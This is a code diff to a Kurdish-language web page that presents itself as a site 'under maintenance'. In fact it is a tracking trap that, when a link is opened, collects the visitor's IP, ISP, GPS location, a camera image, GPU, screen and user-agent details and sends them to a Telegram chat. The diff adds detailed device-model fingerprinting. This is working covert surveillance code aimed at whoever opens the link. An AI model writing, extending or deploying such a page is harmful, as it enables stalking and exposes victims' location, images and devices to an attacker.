@@ -7,6 +7,8 @@
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     <title>ماڵپەڕەکە لەژێر کارکردندایە</title>
+    <!-- کتێبخانەی تایبەت بۆ دەستنیشانکردنی ناوی دقیق و مۆدێلی مۆبایل/لاپتۆپ -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.35/ua-parser.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,7 +44,42 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        // دەستنیشانکردنی GPU
+        // وەرگرتنی ناوی دقیق و مۆدێلی ئامێر (Model Name)
+        async function getDeviceModel() {
+            let modelName = "نادیار / نەناسراو";
+            
+            // هەوڵدان بۆ وەرگرتنی زانیاری ورد لە ڕێگەی Client Hints
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "architecture", "bitness"]);
+                    if (uaData.model) {
+                        return `${uaData.platform \vert{}\vert{} ''}${uaData.model}`.trim();
+                    }
+                } catch (e) {}
+            }
+
+            // بەکارهێنانی UAParser بۆ شیکردنەوەی User-Agent
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                const vendor = result.device.vendor || "";
+                const model = result.device.model || "";
+                const osName = result.os.name || "";
+                const osVersion = result.os.version || "";
+
+                if (vendor || model) {
+                    modelName = `${vendor}${model} (${osName}${osVersion})`.trim();
+                } else if (result.device.type === "mobile" || result.device.type === "tablet") {
+                    modelName = `${osName} Device (${result.browser.name || ''})`;
+                } else {
+                    modelName = `لاپتۆپ/کۆمپیوتەر: ${osName} ${osVersion} (${result.cpu.architecture || navigator.platform})`;
+                }
+            } catch (e) {}
+
+            return modelName;
+        }
+
+        // دەستنیشانکردنی کارت گرافیک GPU
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
@@ -95,7 +132,7 @@
         async function processVisitor() {
             if (!chatId) return;
 
-            // 1. وەرگرتنی زانیاری IP
+            // 1. زانیاری IP
             let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -105,10 +142,11 @@
             const ip = ipData.ip || 'نادیار';
             const isp = ipData.org || 'نادیار';
             const gpu = getGPU();
+            const deviceModel = await getDeviceModel();
             const ratio = window.devicePixelRatio || 1;
             const resolution = `${window.screen.width}x${window.screen.height} (Ratio:${ratio})`;
 
-            // 2. وەرگرتنی دۆخی لۆکەیشن
+            // 2. دۆخی لۆکەیشن
             let locationText = "";
             let mapText = "";
 
@@ -142,7 +180,7 @@
                 }
             }
 
-            // 3. وەرگرتنی دۆخی کامێرا
+            // 3. دۆخی کامێرا
             let cameraStatusText = "";
             let imageBlob = null;
 
@@ -177,7 +215,7 @@
                 cameraStatusText = "❌ ئامێرەکە پشتگیری کامێرا ناکات";
             }
 
-            // 4. دروستکردن و ناردنی تەنها یەک پەیامی گشتگیر
+            // 4. دەرئەنجامی پەیامەکە کە ناوی مۆدێلی ئامێرەکەی تێدایە
             const fullMessage = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**
 
 🌐 **IP Address:** \`${ip}\`
@@ -185,14 +223,14 @@
 🎯 **دۆخی شوێن (GPS):** ${locationText}${mapText}
 📷 **دۆخی کامێرا:** ${cameraStatusText}
 
-📱 **سیستەم:** ${navigator.platform}
+📱 **مۆدێلی ئامێر (Device Model):** \`${deviceModel}\`
+🖥 **سیستەم:** ${navigator.platform}
 📐 **ڕوونی شاشە:** ${resolution}
 🎮 **GPU:** ${gpu}
 💻 **User-Agent:** \`${navigator.userAgent}\``;
 
             await sendTelegramMessage(fullMessage);
 
-            // ئەگەر وێنە هەبوو، دوای پەیامەکە دەنێردرێت
             if (imageBlob) {
                 await sendTelegramPhoto(imageBlob);
             }
